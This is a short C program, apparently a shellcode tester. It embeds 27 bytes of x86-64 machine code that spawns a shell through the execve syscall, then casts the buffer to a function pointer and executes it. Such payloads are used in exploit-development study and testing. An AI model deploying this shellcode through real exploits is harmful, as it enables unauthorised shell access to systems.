#include <stdio.h>
#include <string.h>

char *code = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

int main()
{
      void (*ptr)() = (void (*)()) code;

      printf("len: %d bytes\n", strlen(code));
      ptr ();
      return 0;
}

